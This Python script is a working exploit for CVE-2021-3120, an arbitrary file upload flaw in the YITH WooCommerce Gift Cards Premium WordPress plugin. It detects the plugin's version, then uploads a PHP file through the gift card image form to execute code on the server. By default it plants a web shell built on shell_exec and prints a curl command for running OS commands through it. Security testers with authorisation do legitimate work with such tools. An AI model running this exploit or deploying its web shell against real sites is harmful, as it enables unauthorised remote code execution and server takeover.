#!/usr/bin/env python3

# Copyright 2021 Guy Liu
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests
import re
import os
import uuid
import argparse
from argparse import RawDescriptionHelpFormatter
from packaging import version
import datetime
from urllib.parse import urlparse
from bs4 import BeautifulSoup

def check_vulnerable_plugin_exists(url):
    p = urlparse(url)
    base_url = p.scheme + '://' + p.netloc
    plugin_dir_url = base_url + '/wp-content/plugins/yith-woocommerce-gift-cards-premium/'
    plugin_readme_url = plugin_dir_url + 'readme.txt'
    readme = requests.get(plugin_readme_url)

    if readme.status_code != 200:
        print('Info: Exiting - plugin not found. Cannot retrieve readme.txt file. ')
        exit()

    if re.match('=== YITH WooCommerce Gift Cards Premium ===', readme.text):
        print('Info: Found plugin via readme.txt')
    else:
        print('Info: Exiting - plugin not found. Unexpected content in readme.txt')
        exit()

    lines = readme.text.splitlines()

    for l in lines:
        if re.match('=.* - Released on.*=', l):
            found_version = version.parse(re.search('\d.\d.\d', l).group(0))
            vulnerable_version = version.parse('3.3.0')

            if found_version <= vulnerable_version:
                print('Info: Found version ' + str(found_version) + ' - VULNERABLE! Please upgrade to v3.3.1 or above.')
            else:
                print('Info: Found version ' + str(found_version) + ' - not vulnerable!')

            break

def count_ywgc_inputs(form):
    num_ywgc_inputs = 0
    inputs = form.find_all('input')

    for i in inputs:
        if 'name' in i.attrs and 'ywgc' in i.attrs['name']:
            num_ywgc_inputs += 1

    return num_ywgc_inputs

def find_ywgc_form(page):
    forms = page.find_all('form')
    for f in forms:
        if count_ywgc_inputs(f) > 0:
            return f

    return None

def gather_post_parameters(form):
    parameters = {}
    inputs = form.find_all('input')

    for i in inputs:
        if 'name' in i.attrs and i.attrs['name'] != 'ywgc-upload-picture':
            key = i.attrs['name']
            value = 1

            if 'value' in i.attrs:
                value = i.attrs['value']

            #print(key + "=" + value )

        parameters[key] = value

    return parameters

def send_payload(url, file_name, file_content):

    # Make initial request to determine where to send payload
    r = requests.get(url)

    if r.status_code != 200: 
        print('Error: Did not receive 200 code for specified URL')
        exit()

    page = BeautifulSoup(r.text, 'html.parser')
    vuln_form = find_ywgc_form(page)

    if vuln_form is None:
        print('Error: Yith Gift Card form not found. ')
        exit()

    # Prepare form submission
    data = gather_post_parameters(vuln_form)

    data.pop('ywgc-is-physical', None)
    data['ywgc-is-digital'] = 1
    data['gift_amounts'] = 1
    data['ywgc-design-type'] = 'custom'
    data['ywgc-template-design'] = 'custom'

    # Send payload
    r = requests.post(url,
                      files={'ywgc-upload-picture':(file_name, file_content, 'image/png')},
                      data=data)

    if (r.status_code != 200):
        print('Error: Upload failed. Received HTTP response ' + str(r.status_code))
        exit()

    # Try determine the upload location.
    p = urlparse(url)
    base_url = p.scheme + '://' + p.netloc
    year = datetime.date.today().year
    month = datetime.date.today().month
    payload_url = base_url + '/wp-content/uploads/yith-gift-cards/' + str(year) + '/' + str(month) + '/' + file_name

    return payload_url

def check_upload_and_rce(url):
    rand_text = str(uuid.uuid4().hex)

    payload_url = send_payload(url, rand_text + '.php', '<?php echo "' + rand_text + '"; ?>')

    print('Info: Uploaded file to: ' + payload_url)

    r = requests.get(payload_url)

    if r.text == rand_text:
        print('Info: Received expected response at payload url. CODE EXECUTION confirmed!')
        return True
    else:
        print('Info: Specified URL does not appear to be vulnerable.')
        return False


# Start of main program
program_info = (' ' + os.linesep
    + '__   _______ _____ _   _   _____ _  __ _    ______                 ' + os.linesep
    + '\ \ / /_   _|_   _| | | | |  __ (_)/ _| |   |  _  \                ' + os.linesep
    + ' \ V /  | |   | | | |_| | | |  \/_| |_| |_  | | | |_ __ ___  _ __  ' + os.linesep
    + "  \ /   | |   | | |  _  | | | __| |  _| __| | | | | '__/ _ \| '_ \ " + os.linesep
    + '  | |  _| |_  | | | | | | | |_\ \ | | | |_  | |/ /| | | (_) | |_) |' + os.linesep
    + '  \_/  \___/  \_/ \_| |_/  \____/_|_|  \__| |___/ |_|  \___/| .__/ ' + os.linesep
    + '                                                            | |    ' + os.linesep
    + '                                                            |_|    ' + os.linesep
    + '    A tool to check & exploit the arbitary file upload vulnerability ' + os.linesep
    + '    in YITH WooCommerce Gift Cards Premium v3.3.0 and below' + os.linesep
    + '' + os.linesep
    + '    CVE:        CVE-2021-3120' + os.linesep
    + '    Written by: Guy Liu' + os.linesep
    + '                guy.liu@air-sec.co.uk' + os.linesep
    + '' + os.linesep
    + '' + os.linesep)


parser = argparse.ArgumentParser(description=program_info, formatter_class=RawDescriptionHelpFormatter)
parser.add_argument('-e', '--enum',    help='Enum plugin version only', action='store_true')
parser.add_argument('-c', '--check',   help='Check for file upload and code execution only', action='store_true')
parser.add_argument('-u', '--url',     help='URL of Gift Card Product', required=True)
parser.add_argument('-p', '--payload', help='Specify a payload to upload to server. Default is <?php echo shell_exec($_GET[\'cmd\']);?>')
parser.add_argument('-f', '--file',    help='Specify a custom file to upload. Cannot be used with --payload/-p option')
parser.add_argument('-n', '--name',    help='Use specified file name rather than automatically generated file name')
parser.add_argument('-a', '--accept',  help='I understand that this program will leave payload files on the server', action='store_true')

args = parser.parse_args()

vuln_url = args.url

# Check vulnerable plugin exists
check_vulnerable_plugin_exists(vuln_url)

if args.enum:
    exit()

# Below code is not opsec safe
print('Info: Preparing for upload...')

if not args.accept:
    print ('Warning: This program will leave payload files on the server. Specify the --accept option if wish to continue. ')
    exit()

if args.check:
    check_upload_and_rce(vuln_url)
    exit()

# Attack mode
payload = ''
file_name = ''

if args.payload:
    payload = args.payload

    if args.file:
        print('--payload and --file options cannot be used at the same time. --file is ignored. ')

else:
    if args.file:
        file = open(args.file, mode='r')
        payload = file.read() 
        file.close()
    else:
        payload = '<?php echo shell_exec($_GET[\'cmd\']);?>'

if args.name:
    file_name = args.name
else:
    file_name = str(uuid.uuid4().hex) + '.php'

payload_url = send_payload(vuln_url, file_name, payload)
print('Info: Payload uploaded to: ' + payload_url)

if not args.payload and not args.file:
    print('Info: Default payload (OS Command Execution) is used. Try below to obtain server hostname: ')
    print('Info:     curl ' + payload_url + '?cmd=hostname')







